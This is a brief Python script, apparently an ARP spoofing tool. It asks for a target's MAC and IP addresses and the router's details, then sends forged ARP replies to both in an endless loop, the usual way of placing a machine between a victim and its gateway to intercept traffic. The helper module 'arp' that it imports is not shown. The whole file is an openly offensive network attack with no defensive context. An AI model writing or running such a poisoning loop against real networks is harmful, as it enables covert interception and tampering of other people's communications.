import arp

mac = arp.get_mac()
ip = arp.get_local_ip()

target_mac = input("target's mac address: ")
target_ip = input("target's ip address: ")
default_gateway = input("default gateway: ")
router_mac = input("router's mac: ")

while True:
    arp.arp_reply(ip, mac, target_ip, target_mac)
    arp.arp_reply(ip, mac, default_gateway, router_mac)